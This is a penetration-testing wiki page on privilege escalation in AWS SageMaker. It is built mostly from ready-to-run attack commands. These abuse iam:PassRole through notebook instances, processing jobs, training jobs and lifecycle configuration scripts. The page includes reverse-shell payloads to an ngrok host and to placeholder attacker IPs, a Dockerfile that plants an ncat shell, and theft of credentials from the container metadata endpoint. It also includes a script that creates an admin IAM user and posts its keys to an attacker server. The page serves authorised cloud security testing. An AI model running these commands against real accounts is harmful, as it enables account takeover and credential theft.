# AWS - Sagemaker Privesc

## AWS - Sagemaker Privesc

{{#include ../../../banners/hacktricks-training.md}}

### `iam:PassRole` , `sagemaker:CreateNotebookInstance`, `sagemaker:CreatePresignedNotebookInstanceUrl`

Start creating a noteboook with the IAM Role to access attached to it:

```bash
aws sagemaker create-notebook-instance --notebook-instance-name example \
    --instance-type ml.t2.medium \
    --role-arn arn:aws:iam::<account-id>:role/service-role/<role-name>
```

The response should contain a `NotebookInstanceArn` field, which will contain the ARN of the newly created notebook instance. We can then use the `create-presigned-notebook-instance-url` API to generate a URL that we can use to access the notebook instance once it's ready:

```bash
aws sagemaker create-presigned-notebook-instance-url \
    --notebook-instance-name <name>
```

Navigate to the URL with the browser and click on \`Open JupyterLab\`\` in the top right, then scroll down to “Launcher” tab and under the “Other” section, click the “Terminal” button.

Now It's possible to access the metadata credentials of the IAM Role.

**Potential Impact:** Privesc to the sagemaker service role specified.

### `sagemaker:CreatePresignedNotebookInstanceUrl`

If there are Jupyter **notebooks are already running** on it and you can list them with `sagemaker:ListNotebookInstances` (or discover them in any other way). You can **generate a URL for them, access them, and steal the credentials as indicated in the previous technique**.

```bash
aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name <name>
```

**Potential Impact:** Privesc to the sagemaker service role attached.

### `sagemaker:CreateProcessingJob,iam:PassRole`

An attacker with those permissions can make **sagemaker execute a processingjob** with a sagemaker role attached to it. The attacked can indicate the definition of the container that will be run in an **AWS managed ECS account instance**, and **steal the credentials of the IAM role attached**.

```bash
# I uploaded a python docker image to the ECR
aws sagemaker create-processing-job \
    --processing-job-name privescjob \
    --processing-resources '{"ClusterConfig": {"InstanceCount": 1,"InstanceType": "ml.t3.medium","VolumeSizeInGB": 50}}' \
    --app-specification "{\"ImageUri\":\"<id>.dkr.ecr.eu-west-1.amazonaws.com/python\",\"ContainerEntrypoint\":[\"sh\", \"-c\"],\"ContainerArguments\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/14920 0>&1\\\"\"]}" \
    --role-arn <sagemaker-arn-role>

# In my tests it took 10min to receive the shell
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" #To get the creds
```

**Potential Impact:** Privesc to the sagemaker service role specified.

### `sagemaker:CreateTrainingJob`, `iam:PassRole`

An attacker with those permissions will be able to create a training job, **running an arbitrary container** on it with a **role attached** to it. Therefore, the attcke will be able to steal the credentials of the role.

> [!WARNING]
> This scenario is more difficult to exploit than the previous one because you need to generate a Docker image that will send the rev shell or creds directly to the attacker (you cannot indicate a starting command in the configuration of the training job).
>
> ```bash
> # Create docker image
> mkdir /tmp/rev
> ## Note that the trainning job is going to call an executable called "train"
> ## That's why I'm putting the rev shell in /bin/train
> ## Set the values of <YOUR-IP-OR-DOMAIN> and <YOUR-PORT>
> cat > /tmp/rev/Dockerfile <<EOF
> FROM ubuntu
> RUN apt update && apt install -y ncat curl
> RUN printf '#!/bin/bash\nncat <YOUR-IP-OR-DOMAIN> <YOUR-PORT> -e /bin/sh' > /bin/train
> RUN chmod +x /bin/train
> CMD ncat <YOUR-IP-OR-DOMAIN> <YOUR-PORT> -e /bin/sh
> EOF
>
> cd /tmp/rev
> sudo docker build . -t reverseshell
>
> # Upload it to ECR
> sudo docker login -u AWS -p $(aws ecr get-login-password --region <region>) <id>.dkr.ecr.<region>.amazonaws.com/<repo>
> sudo docker tag reverseshell:latest <account_id>.dkr.ecr.<region>.amazonaws.com/reverseshell:latest
> sudo docker push <account_id>.dkr.ecr.<region>.amazonaws.com/reverseshell:latest
> ```

```bash
# Create trainning job with the docker image created
aws sagemaker create-training-job \
    --training-job-name privescjob \
    --resource-config '{"InstanceCount": 1,"InstanceType": "ml.m4.4xlarge","VolumeSizeInGB": 50}' \
    --algorithm-specification '{"TrainingImage":"<account_id>.dkr.ecr.<region>.amazonaws.com/reverseshell", "TrainingInputMode": "Pipe"}' \
    --role-arn <role-arn> \
    --output-data-config '{"S3OutputPath": "s3://<bucket>"}' \
    --stopping-condition '{"MaxRuntimeInSeconds": 600}'

#To get the creds
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
## Creds env var value example:/v2/credentials/proxy-f00b92a68b7de043f800bd0cca4d3f84517a19c52b3dd1a54a37c1eca040af38-customer
```

**Potential Impact:** Privesc to the sagemaker service role specified.

### `sagemaker:CreateHyperParameterTuningJob`, `iam:PassRole`

An attacker with those permissions will (potentially) be able to create an **hyperparameter training job**, **running an arbitrary container** on it with a **role attached** to it.\
_I haven't exploited because of the lack of time, but looks similar to the previous exploits, feel free to send a PR with the exploitation details._

## References

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{{#include ../../../banners/hacktricks-training.md}}

## **Privilege Escalation via Lifecycle Configurations (LCCs)**

An attacker who has gained the ability to create or modify a SageMaker Lifecycle Configuration (LCC) can use this foothold to escalate privileges, both on the local notebook instance and, more critically, within the AWS account itself. The LCC script inherits all permissions from the IAM role attached to the SageMaker instance, making this a powerful vector for privilege escalation.

### **Notebook Instance Privilege Escalation (to Root)**

Gaining root access on a SageMaker notebook instance is often trivial. The default Amazon Linux environment for these instances typically allows the ec2-user to execute commands with sudo without a password.

* Payload Example (Executing Commands as Root):  
  An attacker can simply prefix commands with sudo inside an LCC script to execute them as root.  

```bash
#!/bin/bash

# Any command here will be run with root privileges
# For example, modifying a system file or installing a rootkit
sudo touch /root/proof_of_root.txt
```

### **AWS Account Privilege Escalation**

The primary risk of LCC compromise is the potential for account-level privilege escalation by abusing the permissions of the attached IAM role. If the SageMaker role is overly permissive, an attacker can move from controlling a single notebook instance to compromising the entire AWS account.

#### **Technique 1: Create a New Admin IAM User**

If the SageMaker role has permissions like iam:CreateUser, iam:CreateAccessKey, and iam:AttachUserPolicy, an attacker can create a new IAM user, grant it administrator privileges, and generate access keys for it.

* **Required Permissions:** iam:CreateUser, iam:CreateAccessKey, iam:AttachUserPolicy.  
* Payload Example (Create Admin User and Exfiltrate Keys):  
  This script creates a new user named aws-admin-backup, attaches the AdministratorAccess policy, and sends the new access keys to an attacker's server.  

```bash
#!/bin/bash

# Attacker server for exfiltration
ATTACKER_SERVER="http://<ATTACKER_IP>:<PORT>"
NEW_USER_NAME="aws-admin-backup"

# Create the new IAM user
aws iam create-user --user-name $NEW_USER_NAME

# Attach the AdministratorAccess policy
aws iam attach-user-policy \
    --user-name $NEW_USER_NAME \
    --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

# Create access keys for the new user and exfiltrate them
aws iam create-access-key --user-name $NEW_USER_NAME | \
curl -X POST -d @- "$ATTACKER_SERVER/keys/$NEW_USER_NAME"

```

#### **Technique 2: Pass an Existing Admin Role to a New EC2 Instance**

The iam:PassRole permission is one of the most commonly misunderstood and abused permissions for privilege escalation. It doesn't allow the current role to *become* another role, but it allows the principal to **pass an existing role to another AWS service**. For example, a user with iam:PassRole can launch a new EC2 instance and tell EC2 to attach a specified role to that instance. The EC2 instance then gets all the permissions of the role that was passed to it.

This is a major security risk because default policies, such as the AmazonSageMakerFullAccess policy, have historically included a dangerously broad iam:PassRole permission on Resource: "\*". This allows the SageMaker role to pass *any* other role in the account—including administrative ones—to a new service, effectively creating a backdoor.

* **Required Permissions:** iam:PassRole, ec2:RunInstances.  
* Payload Example (Launch EC2 with Admin Role and Reverse Shell):  
  This LCC script launches a new EC2 instance, attaches an existing administrator role to it, and uses a user-data script to initiate a reverse shell back to the attacker. This gives the attacker a shell with the full privileges of the passed administrator role.  

```bash
#!/bin/bash

# The ARN of a highly privileged role the SageMaker role is allowed to pass
ADMIN_ROLE_ARN="arn:aws:iam::<ACCOUNT_ID>:instance-profile/EC2-Admin-Role"

# Attacker's IP and Port for the reverse shell
ATTACKER_IP="<ATTACKER_IP>"
ATTACKER_PORT="<PORT>"

# User data script (Base64 encoded) to launch the reverse shell
USER_DATA_BASE64=$(echo "#!/bin/bash
bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1
" | base64 -w 0)

# Launch the new EC2 instance
aws ec2 run-instances \
    --image-id ami-0c55b159cbfafe1f0 \
    --instance-type t2.micro \
    --iam-instance-profile Arn=$ADMIN_ROLE_ARN \
    --user-data $USER_DATA_BASE64
```
  
#### **Technique 3: Modify an Existing Policy to Add Privileges**

If the SageMaker role has permissions to modify existing IAM policies (e.g., iam:CreatePolicyVersion), an attacker can add new, permissive statements to a policy that is already attached to a user or role they control.

* **Required Permissions:** iam:CreatePolicyVersion.  
* Payload Example (Add Full Admin Rights to an Existing Policy):  
  This script creates a new version of an existing policy, making it fully administrative. This would elevate the privileges of any principal already using this policy.  


```bash
#!/bin/bash

# The ARN of a policy the attacker can modify and is attached to a principal they control
TARGET_POLICY_ARN="arn:aws:iam::<ACCOUNT_ID>:policy/TargetUserPolicy"

# Create a new policy document that grants AdministratorAccess
cat << EOF > /tmp/new_policy.json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*"
        }
    ]
}
EOF
```
